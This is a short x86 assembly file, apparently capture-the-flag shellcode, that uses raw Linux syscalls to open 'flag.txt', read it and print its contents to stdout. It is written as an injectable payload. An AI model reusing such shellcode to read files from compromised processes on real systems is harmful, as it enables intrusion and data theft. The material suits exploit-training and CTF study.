BITS 32

;zero out registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor esi, esi

;sys_open
mov al, 5
;push flag.txt
push 0x00000000
push 0x7478742e
push 0x67616c66
mov  ebx, esp
int 0x80


xchg ebx, ecx ;put stack pointer in ecx
xchg eax, ebx ;put fd in ebx

;sys_read
mov al, 0x3
mov dl, 0xff
int 0x80

;sys_write
xchg eax, edx ;number to write
mov  al, 0x4
xor ebx, ebx 
inc ebx;stdout
int 0x80

